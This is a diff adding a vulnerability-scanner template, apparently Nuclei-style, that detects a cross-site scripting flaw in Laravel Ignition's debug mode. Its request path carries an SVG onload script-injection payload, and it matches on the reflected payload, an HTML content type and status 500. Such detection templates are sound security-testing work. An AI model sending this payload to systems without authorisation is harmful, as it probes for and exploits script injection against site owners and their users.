@@ -1,0 +1,30 @@
+id: laravel-ignition-xss
+brief:
+    title: Laravel Ignition - Cross-Site Scripting
+    by: 0x_Akoko
+    level: high
+    about: Laravel Ignition contains a cross-site scripting vulnerability when debug mode is enabled.
+    label:
+        - laravel
+        - xss
+        - ignition
+        - vuln
+    score: CVSS:7.2
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/_ignition/scripts/--><svg%20onload=alert(document.domain)>'
+      signs:
+        - "on": word
+          has:
+            - 'Undefined index: --><svg onload=alert(document.domain)> in file'
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 500
